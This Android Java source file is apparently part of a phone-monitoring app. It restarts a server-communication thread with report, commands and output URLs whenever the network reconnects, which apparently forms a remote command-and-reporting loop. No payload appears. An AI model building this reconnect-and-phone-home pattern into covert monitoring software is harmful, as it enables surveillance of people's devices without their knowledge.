package com.monitor.phone.s0ft.phonemonitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;


public class NetworkChangeBroadcastReceiver extends BroadcastReceiver {


    @Override
    public void onReceive(final Context context, Intent intent) {
        String action = intent.getAction();
        if (action != null && action.equals("android.net.conn.CONNECTIVITY_CHANGE")) {
            if (HelperMethods.isInternetAvailable(context)) {
                ServerTalkLoopThread serverTalkLoopThread = new ServerTalkLoopThread(context, AppSettings.getReportURL(), AppSettings.getCommandsURL(), AppSettings.getOutputURL());
                serverTalkLoopThread.start();
            }
        }

    }
}
